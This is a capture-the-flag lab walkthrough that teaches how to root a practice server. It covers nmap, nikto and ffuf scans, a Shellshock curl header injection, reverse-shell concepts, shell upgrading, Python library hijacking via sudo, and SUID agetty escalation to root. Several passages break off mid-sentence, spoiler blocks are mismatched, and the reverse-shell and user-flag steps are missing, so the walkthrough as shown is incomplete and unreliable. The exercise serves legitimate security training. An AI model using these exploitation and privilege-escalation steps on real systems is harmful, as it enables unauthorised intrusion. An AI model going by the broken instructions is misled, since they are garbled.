# Unpleasant
You are in a position where your friends asked you to help them. As a starting
company they want you to "hack" them, so they can fix their problems right in the
beginning. Would you mind showing off your skills? They bring you a machine with
Kali installed and place you on the same network, where their server is.

## Topology
![Game topology](./topology.svg)

Router's IP - 10.32.51.2

## How to play
You will enter Kali Linux environment on attacker machine and
your job is to get `root` account on the server.

There will be 2 flags on this server, `user.txt` to know that you are
inside the server, and `root.txt` to see that you got `root`.

In a walkthrough, there are 2 levels. The first level represents the description
about each stage - named levels. And the second level can be shown using
the spoiler in the walkthrough. You can use the first level, if you just want
to show tasks. And if you get stuck, use spoilers to show hints.

## Level 1 - Target Discovery
You have now given a VM with Kali Linux 2020.3 preinstalled here. The credentials for this Kali Linux are `kali`:`kali`. You might use these credentials twice
(do not ask me why; I ask myself this question either).

When you are performing an attack, you obviously need to know who you are going
to attack. But we did not provide you with any information about the target.

We can only assure you that the target machine is on your local network.

Now, your job here is to find out what is your network. How can you do that?
> use `ip addr` or `ifconfig`

This level should be pretty easy. You need to find the IP address of your target
machine. Can you do it without a spoiler?

Note: give it some time!

## Level 2 - Target Scanning
After you examine our target, you need to find out what services they are using.
Do they allow the FTP service? Or HTTP? What ports are opened on this target?
For this kind of challenge, we use `nmap`.

> sometimes, higher ports are opened; do not forget to scan all ports,
every time!

You should experiment with the `nmap` tool, as it has some important options to use.
For instance, the `-sS` option will tell `nmap` to make SYN scan, `-sV` to get
the service version, `-O` to guess the OS, etc.

>  On the other hand, while this will scan for all ports,

>
>  Once again, read `man` page for this tool and find out what these options do!
>
>  Open ports: 22/ssh, 80/http <br>

></details>

## Level 3 - Enumerate your target

We saw earlier our opened ports, probably the most iconic duo. What can you do
with this information? How can this be used? If you know, you know. If not,
check the spoiler.

><details>
>  <summary>Spoiler!</summary>

>  Meanwhile, in the background, you can create a new bash session and use the

>  ```cli
>nikto -h http://<TARGET_IP>

>
>  where `-h` is the target IP. Find out more about this tool using `--help` option!
>
>  As our next step should be directory listing. You can choose which
>  tools to use, such as `dirbuster`, `dirb`, `gobuster`, `wfuzz`, `ffuf`, etc.
>  You use wordlist such as `common.txt` or `long.txt` in the
>  `/usr/share/wordlists/dirb/` directory. Example:
>
>  ```cli
>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<TARGET_IP>/FUZZ -t 50
>  ```
>
>  Remember to **check `man` pages!**
>
>  If you check the details of the `nikto` output, it has detected that our target
>  might be vulnerable to the Shellshock vulnerability:
>
> `+ OSVDB-112004: /cgi-bin/printenv: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).`

>
>  TL;DR:
>    When an HTTP request is sent to the server on a specific link,
>    a vulnerable bash version processes trailing strings after function
>    definitions in the values of environment variables.
>
>  So, with this knowledge, you can put bash code inside the HTTP request
>  header, and it will process it. Example:
>
>  ```cli
>curl -H "X-Frame-Options: () { :;}; echo 'hello'" <link>
>  ```
>
>  Although we did not see the response, we can try to create
>  a reverse shell between us and the server with this knowledge.
>
>  The term **reverse shell** means that the actual target will try to connect
>  to **our** machine on a specific port. We need the IP address (of our machine)
>  and open port. Why can we not just connect to the opened port on the target
>  machine?
>
>  We can, but reverse shells are much more used, because their
>  detection is less possible than using **bind shell** (connecting to
>  the opened port on the target machine).
>
>  We have 2 options for this to exploit: craft our payload, which

### Upgrade our shell - get used to it!
After using the `nc` command,
the shell we created is very unstable and uncomfortable. We can't scroll among
commands in the shell, no tab-completing, no job controlling,
no error displaying, etc. We can try to upgrade our shell.

When upgrading the shell, there are a few methods used.
My most used method is using `python`. It is easy, simple, and fast to write.
`which python` will find out if python is installed. Sometimes, we need to
check for `python3` and not `python`. Be aware of that!

We spawn a new shell using this command:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

This will create a new bash session, but we still need to do some configuration.
Stop this process using CTRL + Z, and after that we need these parameters
from your Kali machine:

`stty -a` - to get the number of rows and the number of columns currently used
(for better resolution and display settings in terminal)

`echo $TERM` - get our current terminal

After examining these values, we can now enter back into our shell with limited
functionalities. <br>
**WARNING:** if you are using other shell than zsh (`echo $SHELL`), you need
to enter these commands separately, i.e. on one line each!

`stty raw -echo; fg` - go back to our shell

When we are back, press enter, and then we need to enter values that we noted.
```
export TERM=xterm-256color
```
This is the value from the `echo $TERM` output;
```
export SHELL=/bin/bash
```
since we're using bash.
```
stty rows <ROWS> columns <COLUMNS>
```
ROWS - the number for rows, same goes for COLUMNS;

"I'm in!"

We can now look over here, using tab-completion, scrolling, and many other things,
which are available, since we upgraded the shell.

## Level 4 - Don't try harder - enumerate harder
Your job here is to find something that you can use for privilege escalation.

One of the first things you should check is whether `sudo -l` is enabled. This
command will check if our user has anything allowed to run without a `sudo`
password. Unfortunately, this is not the case, and we need to look for something
else.

The next step could be checking the `/etc/crontab` file. This file contains
commands that are planned to execute in an exact period. Once again, we did not
find anything interesting. :( What now?

What is the content of the `user.txt` flag?

## Level 5 - Straight to the top; unless...?
Cool, now that you are the "normal" user, what does it take you to become a more
privileged user? You need to use the same techniques used previously, search for
the same things, but now you can do some more things... Can you do it without
spoiler? :)

><details>
>  <summary>Spoiler!</summary>
>
>  From the `sudo -l` command, we find out that we can run the command
>  `/usr/bin/python3 /home/michael/try_it.py` as user john.
>  
>  ### Python Library Hijacking
>  In our home directory, we have a file called try_it.py. It is importing the
>  library "random" and calling it the function from it. This program will print
>  the text that is hardcoded. Let's take a closer look.
>
>  In our program we have "import random". The way that Python import

>  and then searches for the script in PYTHONPATH.
>
>  More on this: <br>
>  https://docs.python.org/3/tutorial/modules.html#the-module-search-path
>
>  So, with that, we can try to create a new file called random.py and write
>  the line that we used to upgrade our shell! In the script, do not forget to add
>  a shebang (`#!/usr/bin/python3`) in the script and write down the line
>  `import pty;pty.spawn("/bin/bash")`.
>  We just need to ensure that we added the right lines to spawn a shell.
>
>  The content of the random.py file in the same directory, where we have try_it.py:
>```py
>#!/usr/bin/python3
>import pty
>pty.spawn("/bin/bash")
>```
>  
>  After that, we need to figure out, how to execute the command as another user.
>  Since `runuser` or `su` didn't work out, we finally got the right command!
>```cli
>sudo -u john /usr/bin/python3 /home/michael/try_it.py
>```
>  Now we're the user john! :)
>
></details>

## Level 6 - got root?
Let me introduce you to John, probably the most privileged user, but still
not root.

This level should be fairly easy, if you know what to look for.

What is the content of the `root.txt` flag?

><details>
>  <summary>Spoiler!</summary>
>
>  A little surprise in home directory :)
>  In john's home directory, we have a binary called agetty. This binary has an
>  SUID bit set. We can check, if this binary is not in the list of the binaries,
>  that can be used for privilege escalation. The list is on this website:
>  https://gtfobins.github.io/
>
>  The binary agetty is listed right as a second one. This website tells us,
>  if this binary file has an SUID set, it is possible to escalate our privileges
>  It also tells us the command to use for this privilege escalation,
>  so let's try it! We made a little change, so we spawn a bash session, and not
>  a simple shell session.
>```cli
>./agetty -o -p -l /bin/bash -a root tty
>```
>
>  Now, we got a new bash session. To check, if we are really on a root account,
>  use the `id` command.
>
>  Search for the root.txt file:
>```cli
>find / -type f -name "root.txt" -exec cat {} \; 2>/dev/null
>```
>
